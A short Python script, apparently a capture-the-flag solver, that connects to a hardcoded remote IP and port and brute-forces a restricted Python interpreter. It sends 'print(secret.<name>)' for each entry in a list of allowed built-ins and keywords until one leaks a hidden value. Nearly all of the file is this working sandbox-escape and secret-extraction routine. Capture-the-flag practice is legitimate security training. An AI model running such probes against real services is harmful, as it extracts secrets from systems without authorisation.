import socket

# List of allowed built-ins and keywords (as provided)
allowed_keywords_and_builtins = [
    '__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__',
    '__builtins__', '__file__', '__cached__', 'builtins', 'keyword', 'string', 'banned_words',
    'abs', 'all', 'any', 'ascii', 'bin', 'callable', 'chr', 'compile', 'delattr', 'divmod', 'format', 
    'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'iter', 'aiter', 'len', 'max', 'min', 'next', 
    'anext', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'None', 'Ellipsis', 
    'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'complex', 'dict', 
    'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 
    'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip',
    'BaseException', 'BaseExceptionGroup', 'Exception', 'GeneratorExit', 'KeyboardInterrupt', 'SystemExit', 
    'ArithmeticError', 'AssertionError', 'AttributeError', 'BufferError', 'EOFError', 'ImportError', 
    'LookupError', 'MemoryError', 'NameError', 'OSError', 'ReferenceError', 'RuntimeError', 
    'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SystemError', 'TypeError', 'ValueError', 'Warning', 
    'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'BytesWarning', 'DeprecationWarning', 
    'EncodingWarning', 'FutureWarning', 'ImportWarning', 'PendingDeprecationWarning', 'ResourceWarning', 
    'RuntimeWarning', 'SyntaxWarning', 'UnicodeWarning', 'UserWarning', 'BlockingIOError', 'ChildProcessError', 
    'ConnectionError', 'FileExistsError', 'FileNotFoundError', 'InterruptedError', 'IsADirectoryError', 
    'NotADirectoryError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'IndentationError', 
    'IndexError', 'KeyError', 'ModuleNotFoundError', 'NotImplementedError', 'RecursionError', 
    'UnboundLocalError', 'UnicodeError', 'BrokenPipeError', 'ConnectionAbortedError', 'ConnectionRefusedError', 
    'ConnectionResetError', 'TabError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeTranslateError', 
    'ExceptionGroup', 'EnvironmentError', 'IOError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 
    'help', 'False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break', 'continue', 'def', 'del', 
    'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 
    'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'
]

# Establish connection to the given host and port
host = '34.101.36.1'
port = 9010

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Receive the initial challenge message
response = s.recv(1024).decode()
print(response)

# Brute-force the variable names using the allowed list
for keyword in allowed_keywords_and_builtins:
    # Try to access secret.<keyword>
    user_input = f"print(secret.{keyword})"
    s.sendall(user_input.encode() + b'\n')

    # Receive the response
    response = s.recv(1024).decode()
    print(f"Trying {keyword}: {response}")
    
    # If a valid response (not an error), stop and print the result
    if "Error" not in response and "variable not found" not in response:
        print(f"Found: {keyword} = {response}")
        break

# Close the connection once the correct variable is found
s.close()

